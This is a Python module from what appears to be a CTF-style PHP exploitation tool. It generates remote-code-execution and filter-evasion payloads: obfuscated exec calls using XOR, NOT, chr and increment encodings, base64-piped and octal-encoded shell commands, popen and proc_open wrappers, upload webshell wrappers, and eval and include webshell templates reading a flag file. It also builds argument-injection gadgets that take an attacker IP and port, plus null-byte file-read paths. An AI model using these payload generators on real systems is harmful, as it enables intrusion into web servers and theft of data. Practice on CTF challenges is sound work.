import re
import urllib.parse
from dataclasses import dataclass
from typing import TYPE_CHECKING, Callable, Optional, Tuple

from . import bypass_data
from . import tamper
from . import utils

if TYPE_CHECKING:
    from .auto import AutoContext


@dataclass
class BypassOptions:
    flagfile: str
    read_env: bool
    reflect_shell: bool
    ip: str
    port: int
    phpinfo: bool
    php_version: object = 7.0
    upload: bool = False
    payload_context: str = "any"
    auto_context: Optional["AutoContext"] = None


@dataclass(frozen=True)
class PayloadRecord:
    payload: str
    techniques: Tuple[str, ...]
    min_php: str = ""
    max_php: str = ""
    deprecated_from: str = ""
    requirements: Tuple[str, ...] = ()
    notes: Tuple[str, ...] = ()
    compatibility_confidence: str = "generic"


PHP_EXEC_FUNCTIONS = {"system", "passthru", "shell_exec", "exec", "popen", "proc_open"}
FILE_READ_FUNCTIONS = {
    "file_get_contents",
    "readfile",
    "highlight_file",
    "show_source",
    "file",
    "fopen",
    "splfileobject",
}


@dataclass(frozen=True)
class PayloadExplanation:
    min_php: str = ""
    max_php: str = ""
    deprecated_from: str = ""
    requirements: Tuple[str, ...] = ()
    notes: Tuple[str, ...] = ()
    compatibility_confidence: str = "generic"


@dataclass(frozen=True)
class CompatibilityRule:
    name: str
    matcher: Callable[[str, str], bool]
    min_php: str = ""
    max_php: str = ""
    deprecated_from: str = ""
    requirements: Tuple[str, ...] = ()
    notes: Tuple[str, ...] = ()
    compatibility_confidence: str = "inferred"


def _octal_encode(command: str):
    encoded = "".join(f"\\{oct(ord(c))[2:]}" for c in command)
    return f"$'{encoded}'"


def _wildcard_bypass(path: str):
    if not path or path == "/":
        return path
    parts = path.split("/")
    new_parts = []
    for part in parts:
        if len(part) > 1:
            new_parts.append(part[0] + "?" * (len(part) - 1))
        else:
            new_parts.append(part)
    return "/".join(new_parts)


def _base64_pipe_bypass(command: str):
    import base64

    b64_cmd = base64.b64encode(command.encode()).decode()

    used_vars = []
    assign_base64, concat_base64 = utils._split_string_to_vars("base64", exclude_vars=used_vars)
    used_vars.extend(_extract_var_names(assign_base64))
    assign_sh, concat_sh = utils._split_string_to_vars("sh", exclude_vars=used_vars)
    used_vars.extend(_extract_var_names(assign_sh))
    assign_echo, concat_echo = utils._split_string_to_vars("echo", exclude_vars=used_vars)

    return (
        f"{assign_base64}{assign_sh}{assign_echo} "
        f"{concat_echo} {b64_cmd}| {concat_base64} -d| {concat_sh}"
    )


def _extract_var_names(assign_str: str):
    """Extract variable names from assignment string like 'a=bas;b=e64;'"""
    names = []
    for part in assign_str.split(";"):
        if "=" in part:
            names.append(part.split("=", 1)[0])
    return names


def _render_backtick_payloads(command: str):
    payloads = []
    for template in bypass_data.BACKTICK_TEMPLATES:
        if "{cmd}" in template:
            payloads.append(template.format(cmd=command))
    return payloads


def _escape_php_single_quote(command: str):
    return command.replace("\\", "\\\\").replace("'", "\\'")


def _build_popen_payload(command: str):
    escaped = _escape_php_single_quote(command)
    return (
        f"$__h=popen('{escaped}','r');"
        "if($__h){echo stream_get_contents($__h);pclose($__h);}"
    )


def _build_proc_open_payload(command: str):
    escaped = _escape_php_single_quote(command)
    return (
        "$__spec=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];"
        f"$__p=proc_open('{escaped}',$__spec,$__pipes);"
        "if(is_resource($__p)){"
        "echo stream_get_contents($__pipes[1]);"
        "if(isset($__pipes[0])){fclose($__pipes[0]);}"
        "if(isset($__pipes[1])){fclose($__pipes[1]);}"
        "if(isset($__pipes[2])){fclose($__pipes[2]);}"
        "proc_close($__p);}"
    )


def _build_chr_exec_payload(func: str, command: str):
    chr_func = utils.generate_php_chr(func)
    chr_arg = utils.generate_php_chr(command)
    return f"$_={chr_func};$_({chr_arg});"


def _build_popen_chr_payload(command: str):
    chr_func = utils.generate_php_chr("popen")
    chr_arg = utils.generate_php_chr(command)
    return (
        f"$__f={chr_func};"
        f"$__h=$__f({chr_arg},'r');"
        "if($__h){echo stream_get_contents($__h);pclose($__h);}"
    )


def _build_proc_open_chr_payload(command: str):
    chr_func = utils.generate_php_chr("proc_open")
    chr_arg = utils.generate_php_chr(command)
    return (
        f"$__f={chr_func};"
        "$__spec=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];"
        f"$__p=$__f({chr_arg},$__spec,$__pipes);"
        "if(is_resource($__p)){"
        "echo stream_get_contents($__pipes[1]);"
        "if(isset($__pipes[0])){fclose($__pipes[0]);}"
        "if(isset($__pipes[1])){fclose($__pipes[1]);}"
        "if(isset($__pipes[2])){fclose($__pipes[2]);}"
        "proc_close($__p);}"
    )


def _to_php_expr(payload: str):
    expr = payload.strip()
    if not expr:
        return None
    if expr.endswith(";"):
        expr = expr[:-1].strip()
    if not expr:
        return None
    return expr


def _render_upload_wrapper(template: str, payload: str, expr: str):
    if "{expr}" in template:
        if expr is None:
            return None
        return template.format(payload=payload, expr=expr)
    return template.format(payload=payload, expr=expr)


def _is_upload_wrapper_like_payload(payload: str):
    normalized = payload.strip().lower()
    if not normalized:
        return False
    if normalized.startswith("<?"):
        return True
    if normalized.startswith("<%"):
        return True
    if normalized.startswith('<script language="php">'):
        return True
    if normalized.startswith("gif89a<?"):
        return True
    if normalized.startswith("gif89a<%"):
        return True
    if normalized.startswith('gif89a<script language="php">'):
        return True
    if "<?" in normalized and "?>" in normalized:
        return True
    if "<%" in normalized and "%>" in normalized:
        return True
    if '<script language="php">' in normalized and "</script>" in normalized:
        return True
    return False


def _is_php_style_payload(payload: str):
    stripped = payload.strip()
    lowered = stripped.lower()
    if not stripped:
        return False

    # Shell ANSI-C quoting starts with $'...', which is not valid PHP code.
    if stripped.startswith("$'") or stripped.startswith('$"'):
        return False

    if _is_upload_wrapper_like_payload(stripped):
        return True

    if lowered.startswith("`") and lowered.endswith("`"):
        return True

    php_prefixes = (
        "phpinfo(",
        "print_r(",
        "var_dump(",
        "var_export(",
        "echo ",
        "echo(",
        "print(",
        "show_source(",
        "highlight_file(",
        "readgzfile(",
        "include ",
        "include(",
        "require ",
        "require(",
        "include_once(",
        "require_once(",
        "eval(",
        "assert(",
        "system(",
        "passthru(",
        "shell_exec(",
        "exec(",
        "popen(",
        "proc_open(",
        "call_user_func(",
        "die(",
        "exit(",
        "$",
        "(~",
    )
    if lowered.startswith(php_prefixes):
        return True

    if "$_=" in lowered or "get_defined_vars" in lowered or "getallheaders" in lowered:
        return True

    return False


def _is_shell_style_payload(payload: str):
    stripped = payload.strip()
    if not stripped:
        return False
    if _is_upload_wrapper_like_payload(stripped):
        return False
    return not _is_php_style_payload(stripped)


def _is_eval_safe_php_payload(payload: str):
    stripped = payload.strip()
    if not _is_php_style_payload(stripped):
        return False
    if stripped.startswith("`") and stripped.endswith("`"):
        return False
    return True


def _php_version(options: "BypassOptions"):
    ctx = getattr(options, "auto_context", None)
    hinted = getattr(ctx, "php_version_tuple_hint", None)
    if hinted:
        return utils.parse_php_version(hinted)
    hinted = getattr(ctx, "php_version_hint", None)
    if hinted is not None:
        return utils.parse_php_version(hinted)
    return utils.parse_php_version(options.php_version)


def _disabled_functions(options: "BypassOptions"):
    ctx = getattr(options, "auto_context", None)
    return {str(item or "").strip().lower() for item in getattr(ctx, "disable_functions", []) if str(item or "").strip()}


def _payload_uses_legacy_upload_tag(payload: str):
    lowered = payload.strip().lower()
    return lowered.startswith("<%") or lowered.startswith("gif89a<%") or lowered.startswith(
        '<script language="php">'
    ) or 'gif89a<script language="php">' in lowered


def _payload_uses_php7_expression_call(payload: str):
    stripped = payload.strip()
    lowered = stripped.lower()
    return (
        re.match(r"^\(?\s*['\"](?:system|phpinfo|exec|passthru|shell_exec|popen|proc_open)['\"]\s*\)?\s*\(", stripped, re.I)
        is not None
        or lowered.startswith("(~")
    )


def _regex_rule(pattern: str, flags=0):
    compiled = re.compile(pattern, flags)
    return lambda _text, lowered: compiled.search(lowered) is not None


def _substring_rule(value: str):
    lowered_value = value.lower()
    return lambda _text, lowered: lowered_value in lowered


COMPATIBILITY_CONFIDENCE_ORDER = {
    "generic": 0,
    "inferred": 1,
    "contextual": 2,
    "explicit": 3,
    "version_sensitive": 4,
}


COMPATIBILITY_RULES = (
    CompatibilityRule(
        name="preg_replace_e",
        matcher=lambda _text, lowered: "preg_replace('/.*/e'" in lowered
        or re.search(r"preg_replace\s*\([^)]*/e['\"]", lowered) is not None,
        min_php="5.6",
        max_php="5.6",
        notes=("preg_replace /e is removed in PHP 7",),
        compatibility_confidence="explicit",
    ),
    CompatibilityRule(
        name="create_function",
        matcher=_substring_rule("create_function"),
        min_php="5.6",
        max_php="7.4",
        deprecated_from="7.2",
        notes=("create_function is removed in PHP 8",),
        compatibility_confidence="explicit",
    ),
    CompatibilityRule(
        name="assert_string_exec",
        matcher=_regex_rule(r"\bassert\s*\("),
        min_php="5.6",
        max_php="7.4",
        deprecated_from="7.2",
        notes=("assert(string) no longer evaluates code in PHP 8",),
        compatibility_confidence="inferred",
    ),
    CompatibilityRule(
        name="ffi_cdef",
        matcher=_substring_rule("ffi::cdef"),
        min_php="7.4",
        requirements=("FFI extension and ffi.enable",),
        compatibility_confidence="explicit",
    ),
    CompatibilityRule(
        name="pcntl_exec",
        matcher=_substring_rule("pcntl_exec"),
        requirements=("pcntl extension",),
        compatibility_confidence="inferred",
    ),
    CompatibilityRule(
        name="ld_preload",
        matcher=_substring_rule("ld_preload"),
        requirements=("LD_PRELOAD-capable mail/sendmail path",),
        compatibility_confidence="inferred",
    ),
    CompatibilityRule(
        name="imagick_msl",
        matcher=_substring_rule("imagick("),
        requirements=("Imagick extension with MSL/vid support",),
        compatibility_confidence="inferred",
    ),
    CompatibilityRule(
        name="open_basedir_runtime_relaxation",
        matcher=lambda _text, lowered: "ini_set('open_basedir','..')" in lowered
        or 'ini_set("open_basedir","..")' in lowered,
        max_php="8.2",
        requirements=("PHP < 8.3 runtime open_basedir relaxation",),
        compatibility_confidence="explicit",
    ),
    CompatibilityRule(
        name="php_stream_filter",
        matcher=_substring_rule("php://filter"),
        requirements=("PHP stream wrappers enabled",),
        compatibility_confidence="inferred",
    ),
    CompatibilityRule(
        name="php_data_wrapper",
        matcher=_substring_rule("data://text/plain"),
        requirements=("allow_url_include for include-style execution",),
        compatibility_confidence="inferred",
    ),
    CompatibilityRule(
        name="expect_wrapper",
        matcher=_substring_rule("expect://"),
        requirements=("expect extension",),
        compatibility_confidence="inferred",
    ),
    CompatibilityRule(
        name="zip_wrapper",
        matcher=_substring_rule("zip://"),
        requirements=("zip wrapper and controllable archive",),
        compatibility_confidence="inferred",
    ),
)


def _payload_calls_disabled_function(payload: str, disabled_functions):
    if not disabled_functions:
        return False
    lowered = payload.lower()
    if "ffi::cdef" in lowered:
        return False
    if "shell_exec" in disabled_functions and "`" in payload:
        return True
    for func in sorted(disabled_functions):
        if not func:
            continue
        if re.search(rf"(?<!->)\b{re.escape(func)}\s*\(", lowered):
            return True
        if re.search(rf"['\"]{re.escape(func)}['\"]\s*\(", lowered):
            return True
        if re.search(rf"['\"]{re.escape(func)}['\"]\s*,", lowered):
            return True
    return False


def _merge_min_php(current: str, incoming: str):
    if not incoming:
        return current
    if not current:
        return incoming
    return incoming if utils.parse_php_version(incoming) > utils.parse_php_version(current) else current


def _merge_max_php(current: str, incoming: str):
    if not incoming:
        return current
    if not current:
        return incoming
    return incoming if utils.parse_php_version(incoming) < utils.parse_php_version(current) else current


def _merge_deprecated_from(current: str, incoming: str):
    if not incoming:
        return current
    if not current:
        return incoming
    return incoming if utils.parse_php_version(incoming) < utils.parse_php_version(current) else current


def _merge_confidence(current: str, incoming: str):
    if COMPATIBILITY_CONFIDENCE_ORDER.get(incoming, 0) > COMPATIBILITY_CONFIDENCE_ORDER.get(current, 0):
        return incoming
    return current


def _append_unique(items, value: str):
    if value and value not in items:
        items.append(value)


def _decoded_payload_forms(payload: str):
    forms = [payload or ""]
    queue = [payload or ""]
    for _round in range(2):
        next_queue = []
        for value in queue:
            for decoder in (urllib.parse.unquote, urllib.parse.unquote_plus):
                try:
                    decoded = decoder(value)
                except Exception:
                    continue
                if decoded not in forms:
                    forms.append(decoded)
                    next_queue.append(decoded)
        queue = next_queue
    return forms


def _has_null_byte(payload: str):
    lowered = (payload or "").lower()
    return "\x00" in payload or "%00" in lowered or "%2500" in lowered


def _context_has_byte_drop_transform(auto_context):
    preprocessors = {str(item or "").lower() for item in getattr(auto_context, "preprocessors", [])}
    return bool({"iconv", "mb_convert_encoding"} & preprocessors)


def _decoded_null_byte_is_interleaved_path(decoded: str):
    if "\x00" not in decoded:
        return False
    # f\0l\0a\0g and /f\0l\0a\0g style payloads rely on a transform dropping
    # inserted bytes, not historical path truncation after a complete filename.
    return re.search(r"(?:[A-Za-z0-9._/-]\x00){2,}[A-Za-z0-9._/-]?", decoded) is not None


def _decoded_null_byte_looks_like_legacy_truncation(decoded: str):
    if "\x00" not in decoded:
        return False
    prefix, suffix = decoded.split("\x00", 1)
    if not prefix:
        return False
    if _decoded_null_byte_is_interleaved_path(decoded):
        return False
    return suffix == "" or suffix.startswith(".") or "/" not in suffix


def _apply_null_byte_compatibility(payload: str, payload_context: str, auto_context, state):
    if not _has_null_byte(payload):
        return

    requirements, notes = state["requirements"], state["notes"]
    state["compatibility_confidence"] = _merge_confidence(
        state["compatibility_confidence"],
        "contextual",
    )

    decoded_forms = _decoded_payload_forms(payload)
    has_interleaved = any(_decoded_null_byte_is_interleaved_path(form) for form in decoded_forms)
    has_legacy_truncation = any(_decoded_null_byte_looks_like_legacy_truncation(form) for form in decoded_forms)

    if has_interleaved or _context_has_byte_drop_transform(auto_context):
        _append_unique(
            requirements,
            "transform/preprocessor must drop or ignore inserted NUL bytes before the sink",
        )
        _append_unique(
            notes,
            "NUL-byte interleave is treated as a transform-chain bypass, not a PHP null-byte truncation primitive",
        )
        return

    if has_legacy_truncation:
        state["max_php"] = _merge_max_php(state["max_php"], "5.3.3")
        state["compatibility_confidence"] = _merge_confidence(
            state["compatibility_confidence"],
            "version_sensitive",
        )
        _append_unique(requirements, "legacy null-byte path truncation")
        _append_unique(notes, "PHP path APIs reject NUL bytes on modern PHP versions")
        return

    _append_unique(requirements, "NUL bytes must be stripped or ignored before the sink")
    _append_unique(notes, "NUL-byte payload is context-sensitive and may fail on direct PHP file APIs")


def describe_payload(payload: str, payload_context: str = "any", auto_context=None) -> PayloadExplanation:
    text = payload or ""
    lowered = text.lower()
    state = {
        "requirements": [],
        "notes": [],
        "min_php": "",
        "max_php": "",
        "deprecated_from": "",
        "compatibility_confidence": "generic",
    }

    def require(value: str):
        _append_unique(state["requirements"], value)

    def note(value: str):
        _append_unique(state["notes"], value)

    if _payload_uses_legacy_upload_tag(text):
        state["min_php"] = _merge_min_php(state["min_php"], "5.6")
        state["max_php"] = _merge_max_php(state["max_php"], "5.6")
        state["compatibility_confidence"] = _merge_confidence(state["compatibility_confidence"], "explicit")
        require("PHP < 7.0 legacy ASP/script tags enabled")

    for rule in COMPATIBILITY_RULES:
        if not rule.matcher(text, lowered):
            continue
        state["min_php"] = _merge_min_php(state["min_php"], rule.min_php)
        state["max_php"] = _merge_max_php(state["max_php"], rule.max_php)
        state["deprecated_from"] = _merge_deprecated_from(
            state["deprecated_from"],
            rule.deprecated_from,
        )
        state["compatibility_confidence"] = _merge_confidence(
            state["compatibility_confidence"],
            rule.compatibility_confidence,
        )
        for item in rule.requirements:
            require(item)
        for item in rule.notes:
            note(item)

    if _payload_uses_php7_expression_call(text):
        state["min_php"] = _merge_min_php(state["min_php"], "7.0")
        state["compatibility_confidence"] = _merge_confidence(state["compatibility_confidence"], "explicit")
    if "`" in text:
        state["deprecated_from"] = _merge_deprecated_from(state["deprecated_from"], "8.5")
        state["compatibility_confidence"] = _merge_confidence(state["compatibility_confidence"], "explicit")
        require("shell_exec enabled")
        note("backticks are equivalent to shell_exec")

    _apply_null_byte_compatibility(text, payload_context, auto_context, state)

    return PayloadExplanation(
        min_php=state["min_php"],
        max_php=state["max_php"],
        deprecated_from=state["deprecated_from"],
        requirements=tuple(state["requirements"]),
        notes=tuple(state["notes"]),
        compatibility_confidence=state["compatibility_confidence"],
    )


def _payload_matches_runtime(payload: str, version, disabled_functions=(), payload_context="any", auto_context=None):
    explanation = describe_payload(payload, payload_context=payload_context, auto_context=auto_context)
    parsed = utils.parse_php_version(version)
    if explanation.min_php and parsed < utils.parse_php_version(explanation.min_php):
        return False
    if explanation.max_php and not _php_version_lte_declared_max(parsed, explanation.max_php):
        return False
    if _payload_calls_disabled_function(payload, disabled_functions):
        return False
    return True


def _php_version_lte_declared_max(parsed_version, max_php: str):
    parts = [part for part in str(max_php).split(".") if part != ""]
    parsed_max = utils.parse_php_version(max_php)
    if len(parts) <= 1:
        return parsed_version[0] <= parsed_max[0]
    if len(parts) == 2:
        return parsed_version[:2] <= parsed_max[:2]
    return parsed_version <= parsed_max


def _filter_payloads_for_runtime(payloads, options: "BypassOptions"):
    version = _php_version(options)
    disabled = _disabled_functions(options)
    return [
        payload
        for payload in payloads
        if _payload_matches_runtime(
            payload,
            version,
            disabled_functions=disabled,
            payload_context=options.payload_context,
            auto_context=options.auto_context,
        )
    ]


def _normalize_payload_context(payload_context: str):
    normalized = str(payload_context or "any").strip().lower()
    if normalized in {"php", "php_eval", "php_code", "eval"}:
        return "php_code"
    if normalized in {"shell", "shell_cmd", "shell_command", "command"}:
        return "shell_command"
    if normalized in {"file", "path", "file_path", "file_read_path"}:
        return "file_path"
    if normalized in {"query", "query_value", "url_query", "url_query_value"}:
        return "url_query_value"
    return "any"


def _is_file_path_payload(payload: str):
    stripped = payload.strip()
    lowered = stripped.lower()
    if not stripped:
        return False
    if _is_upload_wrapper_like_payload(stripped) or _is_php_style_payload(stripped):
        return False
    if lowered.startswith("data://"):
        return True
    decoded_forms = [lowered]
    try:
        decoded_forms.append(urllib.parse.unquote_plus(stripped).lower())
    except Exception:
        pass
    command_prefixes = (
        "cat ",
        "tac ",
        "nl ",
        "more ",
        "less ",
        "head ",
        "tail ",
        "sort ",
        "od ",
        "strings ",
        "paste ",
        "grep ",
        "sed ",
        "rev ",
        "uniq ",
        "base64 ",
        "awk ",
        "dd ",
        "perl ",
        "busybox ",
        "vi ",
        "shuf ",
        "xargs ",
        "cut ",
        "column ",
        "pr ",
        "xxd ",
        "file ",
        "env ",
        "bash ",
        "tar ",
    )
    if any(form.startswith(command_prefixes) for form in decoded_forms):
        return False
    shell_tokens = ("`", "$(", "${ifs}", "$ifs", "&&", "||", "|", ";")
    if any(token in form for form in decoded_forms for token in shell_tokens):
        return False
    if " " in stripped:
        return False
    return bool(
        stripped.startswith(("/", "./", "../"))
        or "://" in lowered
        or "%" in stripped
        or "\x00" in stripped
        or re.fullmatch(r"[A-Za-z0-9._%+\\/-]+", stripped)
    )


def _filter_payloads_for_context(payloads, payload_context: str):
    normalized = _normalize_payload_context(payload_context)
    if normalized == "any":
        return utils.dedupe_preserve_order(payloads)

    if normalized in {"file_path", "url_query_value"}:
        return utils.dedupe_preserve_order(
            [payload for payload in payloads if _is_file_path_payload(payload)]
        )

    matcher = _is_eval_safe_php_payload if normalized == "php_code" else _is_shell_style_payload
    filtered = [payload for payload in payloads if matcher(payload)]
    return utils.dedupe_preserve_order(filtered)


def _apply_upload_php_wrappers(payloads, php_version: float):
    templates = list(bypass_data.SHORT_TAG_TEMPLATES)
    templates.extend(bypass_data.UPLOAD_MODERN_WRAPPER_TEMPLATES)
    if utils.php_version_before(php_version, "7.0"):
        templates.extend(bypass_data.UPLOAD_LEGACY_WRAPPER_TEMPLATES)

    wrapped = []
    for payload in payloads:
        if not _is_php_style_payload(payload):
            continue
        if _is_upload_wrapper_like_payload(payload):
            continue
        expr = _to_php_expr(payload)
        for template in templates:
            rendered = _render_upload_wrapper(template, payload, expr)
            if rendered:
                wrapped.append(rendered)
    return wrapped


def _apply_upload_shell_wrappers(payloads):
    wrapped = []
    for payload in payloads:
        if not _is_shell_style_payload(payload):
            continue
        cmd = payload.strip()
        for template in bypass_data.UPLOAD_SHELL_CMD_WRAPPER_TEMPLATES:
            wrapped.append(template.format(cmd=cmd))
    return wrapped


def _analyze_block_reasons(payload: str, waf_words, waf_chars, waf_regex):
    reasons = {
        "blocked_words": [],
        "blocked_chars": [],
        "regex_match": None,
    }

    lower_payload = payload.lower()
    if waf_words:
        for word in waf_words:
            if word and word.lower() in lower_payload:
                reasons["blocked_words"].append(word)

    if waf_chars:
        reasons["blocked_chars"] = [ch for ch in set(payload) if ch in waf_chars]

    if waf_regex:
        match = waf_regex.search(payload)
        if match:
            reasons["regex_match"] = match.group(0)

    return reasons


def _apply_space_replacements(payload: str):
    if " " not in payload:
        return [payload]

    candidates = [payload]
    for replacement in bypass_data.SPACE_BYPASS_REPLACEMENTS:
        candidates.append(payload.replace(" ", replacement))
    return utils.dedupe_preserve_order(candidates)


def _is_space_blocked(reasons):
    if " " in reasons["blocked_chars"]:
        return True
    if any(" " in word for word in reasons["blocked_words"]):
        return True
    regex_match = reasons["regex_match"]
    if regex_match and " " in regex_match:
        return True
    return False


def _apply_targeted_replacements(payload: str, waf_words, waf_chars, waf_regex, payload_context="any"):
    reasons = _analyze_block_reasons(payload, waf_words, waf_chars, waf_regex)
    candidates = [payload]

    if _is_space_blocked(reasons):
        candidates.extend(_apply_space_replacements(payload))

    candidates.extend(
        tamper.apply_contextual_tampers(
            payload,
            reasons,
            payload_context=payload_context,
            shell_like=_is_shell_style_payload(payload),
        )
    )

    return utils.dedupe_preserve_order(candidates)


def _build_targeted_candidates(payloads, waf_words, waf_chars, waf_regex, payload_context="any"):
    targeted = []
    for payload in payloads:
        targeted.extend(
            _apply_targeted_replacements(
                payload,
                waf_words,
                waf_chars,
                waf_regex,
                payload_context=payload_context,
            )
        )
    return utils.dedupe_preserve_order(targeted)


def infer_payload_techniques(payload: str):
    text = payload or ""
    lowered = text.lower()
    labels = []

    def add(label):
        if label not in labels:
            labels.append(label)

    if _is_upload_wrapper_like_payload(text):
        add("upload_wrapper")
    if "`" in text:
        add("shell_backticks")
    if lowered.startswith("$'"):
        add("shell_octal")
    if "${ifs}" in lowered or "$ifs$9" in lowered:
        add("tamper:space2ifs")
    if "\t" in text or "%09" in lowered or "\\t" in lowered:
        add("tamper:space2htab")
    if "+" in text and " " not in text:
        add("tamper:space2plus")
    if "${pwd:0:1}" in lowered:
        add("tamper:slash2env")
    if "''" in text:
        add("tamper:singlequotes")
    if '""' in text:
        add("tamper:doublequotes")
    if re.search(r"[A-Za-z]\\[A-Za-z]", text):
        add("tamper:backslashes")
    if "${purewaf_x}" in lowered:
        add("tamper:uninitializedvariable")
    if "php://filter" in lowered:
        add("php_stream_filter")
    if "%00" in lowered or "\x00" in text:
        add("null_byte")
    if re.search(r"(?:%[0-9a-f]{2}){2,}", lowered):
        add("percent_byte_path")
    if any(token in lowered for token in ("%e4", "%b8", "%af", "%e6", "%9c", "%87")) and re.search(
        r"%[0-9a-f]{2}[A-Za-z0-9._~-]",
        lowered,
    ):
        add("iconv_ignore_interleave")
    if "data://text/plain" in lowered:
        add("php_data_wrapper")
    if "getallheaders" in lowered:
        add("header_exec")
    if "get_defined_vars" in lowered:
        add("variable_hijack")
    if "scandir" in lowered or "glob(" in lowered or "directoryiterator" in lowered:
        add("directory_enum")
    if "chr(" in lowered:
        add("php_chr")
    if "(~" in lowered or "~'" in lowered:
        add("php_not")
    if "^" in text:
        add("php_xor")
    if "$____" in text:
        add("php_increment")
    if "nan" in lowered or "$$_[" in text:
        add("non_alnum_post_gateway")
    if "open_basedir" in lowered or "glob://" in lowered:
        add("open_basedir_bypass")
    if "ld_preload" in lowered or "ffi::cdef" in lowered or "pcntl_exec" in lowered:
        add("disable_functions_bypass")
    if any(token in lowered for token in ("system(", "passthru(", "shell_exec(", "exec(", "popen(", "proc_open(")):
        add("php_exec_wrapper")
    if any(lowered.startswith(cmd) for cmd in ("cat ", "tac ", "nl ", "sort ", "od ", "strings ", "dd ", "tail ", "head ")):
        add("file_read_shell")
    if "include" in lowered or "require" in lowered:
        add("php_include")
    if not labels:
        add("raw")
    return tuple(labels)


def build_payload_record(payload: str, payload_context: str = "any", auto_context=None):
    explanation = describe_payload(
        payload,
        payload_context=payload_context,
        auto_context=auto_context,
    )
    return PayloadRecord(
        payload=payload,
        techniques=infer_payload_techniques(payload),
        min_php=explanation.min_php,
        max_php=explanation.max_php,
        deprecated_from=explanation.deprecated_from,
        requirements=explanation.requirements,
        notes=explanation.notes,
        compatibility_confidence=explanation.compatibility_confidence,
    )


def generate_candidate_records(options: BypassOptions):
    return [
        build_payload_record(
            payload,
            payload_context=options.payload_context,
            auto_context=options.auto_context,
        )
        for payload in generate_candidates(options)
    ]


def _append_increment_with_url(payloads, raw_payload: str):
    payloads.append(raw_payload)
    encoded_payload = utils.url_encode(raw_payload)
    if encoded_payload != raw_payload:
        payloads.append(encoded_payload)


def _generate_php_rce_payloads(command: str, php_version: object, disabled_functions=()):
    payloads = []
    disabled = {str(item or "").lower() for item in disabled_functions}
    if "shell_exec" not in disabled:
        payloads.extend(_render_backtick_payloads(command))

    for func in bypass_data.PHP_EXEC_WRAPPERS:
        if func.lower() in disabled:
            continue
        if func in {"popen", "proc_open"}:
            continue

        if utils.php_version_at_least(php_version, "7.0"):
            not_func = utils.generate_php_not(func)
            not_arg = utils.generate_php_not(command)
            if not_func and not_arg:
                payloads.append(f"{not_func}({not_arg});")

        xor_func = utils.generate_php_xor(func)
        xor_arg = utils.generate_php_xor(command)
        if xor_func and xor_arg:
            payloads.append(f"$_={xor_func};$_({xor_arg});")

        inc_func_code = utils.generate_php_increment(func)
        if inc_func_code and xor_arg:
            increment_payload = f"{inc_func_code};$_____({xor_arg});"
            _append_increment_with_url(payloads, increment_payload)

        payloads.append(_build_chr_exec_payload(func, command))

    if "popen" in bypass_data.PHP_EXEC_WRAPPERS and "popen" not in disabled:
        payloads.append(_build_popen_payload(command))
        payloads.append(_build_popen_chr_payload(command))
    if "proc_open" in bypass_data.PHP_EXEC_WRAPPERS and "proc_open" not in disabled:
        payloads.append(_build_proc_open_payload(command))
        payloads.append(_build_proc_open_chr_payload(command))

    return payloads


def _append_upload_exec_payloads(payloads):
    payloads.extend(bypass_data.UPLOAD_EXEC_TEMPLATES)
    for cmd in bypass_data.UPLOAD_EXEC_TEMPLATES:
        for wrapper in bypass_data.UPLOAD_EXEC_WRAPPER_TEMPLATES:
            payloads.append(wrapper.format(cmd=cmd))


def _safe_format(template: str, **values) -> str:
    """
    _safe_format("cat {path}; find . -exec echo {} \\;", path="/flag")

    替换为：

    "cat /flag; find . -exec echo {} \\;"
    """
    out = template
    for key, val in values.items():
        out = out.replace("{" + key + "}", str(val))
    return out


def _render_argument_injection_payloads(options: "BypassOptions"):
    ctx = options.auto_context
    if ctx is None or not ctx.fixed_command_prefix:
        return []
    prefix = ctx.fixed_command_prefix.lower()
    templates = bypass_data.AUTO_ARG_INJECT_BY_CMD.get(prefix)
    if not templates:
        return []
    path = options.flagfile or "/flag"
    rendered = []
    for tpl in templates:
        arg = _safe_format(tpl, path=path, ip=options.ip, port=options.port)
        rendered.append(f"{prefix} {arg}")
        # Also emit a plain `arg`-only variant in case auto runs with a sink
        # that already prepends the prefix.
        rendered.append(arg)
    return rendered


def _render_sanitizer_aware_payloads(options: "BypassOptions"):
    ctx = options.auto_context
    if ctx is None or not ctx.sanitizers:
        return []
    out = []
    path = options.flagfile or "/flag"
    for san in ctx.sanitizers:
        if san == "escapeshellarg":
            out.extend(
                _safe_format(t, path=path, ip=options.ip, port=options.port)
                for t in bypass_data.AUTO_ESCAPESHELLARG_GADGETS
            )
        elif san == "escapeshellcmd":
            out.extend(bypass_data.AUTO_ESCAPESHELLCMD_GADGETS)
        elif san == "addslashes":
            out.extend(_safe_format(t, path=path) for t in bypass_data.AUTO_ADDSLASHES_SAFE)
        elif san in {"htmlspecialchars", "htmlentities"}:
            out.extend(
                _safe_format(t, path=path) for t in bypass_data.AUTO_HTMLSPECIALCHARS_SAFE
            )
    return out


def _render_precise_webshell_payloads(options: "BypassOptions"):
    ctx = options.auto_context
    if ctx is None:
        return []
    out = []
    path = options.flagfile or "/flag"
    key = ctx.input_key or "x"
    if ctx.sink_function in {"eval", "assert"} or (
        ctx.sink_function == "" and ctx.input_key
    ):
        for tpl in bypass_data.AUTO_PRECISE_EVAL_TEMPLATES:
            out.append(_safe_format(tpl, key=key, path=path))
    if ctx.sink_function in {"include", "include_once", "require", "require_once"} or ctx.sink_kind == "php_include":
        b64 = utils.base64_encode(f"<?php system('cat {path}');?>")
        for tpl in bypass_data.AUTO_PRECISE_INCLUDE_TEMPLATES:
            out.append(_safe_format(tpl, path=path, b64=b64))
    return out


def _render_file_read_path_payloads(options: "BypassOptions"):
    ctx = options.auto_context
    if ctx is None:
        return []
    if ctx.sink_function.lower() not in FILE_READ_FUNCTIONS:
        return []
    path = options.flagfile or "/flag"
    return [_safe_format(tpl, path=path) for tpl in bypass_data.AUTO_FILE_READ_PATH_TEMPLATES]


def _is_file_read_path_auto_context(options: "BypassOptions"):
    ctx = options.auto_context
    if ctx is None:
        return False
    return ctx.sink_function.lower() in FILE_READ_FUNCTIONS


def _file_read_target_variants(path: str):
    normalized = (path or "/flag").replace("\\", "/") or "/flag"
    leaf = normalized.rsplit("/", 1)[-1]
    variants = [normalized]
    if leaf and leaf != normalized:
        variants.append(leaf)
    return utils.dedupe_preserve_order(variants)


def _render_null_byte_file_read_payloads(options: "BypassOptions"):
    if not _is_file_read_path_auto_context(options):
        return []
    out = []
    path = options.flagfile or "/flag"
    for target in _file_read_target_variants(path):
        out.extend(
            [
                f"%00{target}%00",
                f"{target}%00",
                f"{target}%00.php",
                f"{target}%2500",
                f"{target}%2500.php",
            ]
        )
